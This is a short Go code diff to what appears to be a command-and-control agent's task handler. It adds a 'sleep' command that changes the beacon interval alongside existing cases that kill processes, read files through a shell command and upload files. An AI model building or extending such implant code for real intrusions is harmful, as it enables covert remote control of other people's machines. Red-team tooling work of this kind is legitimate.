@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"path"
+	"strconv"
 	"strings"
 	"time"
 
@@ -43,6 +44,9 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			data = fmt.Sprintf("killed process (%s)", pid)
 		case "cat":
 			data, _ = hg.PsReturn("type " + taskData)
+		case "sleep":
+			newSleepTime := taskData
+			*sleep, _ = strconv.Atoi(newSleepTime)
 		case "upload":
 			taskDataSplit := strings.Split(taskData, " ")
 			uFile := taskDataSplit[0]
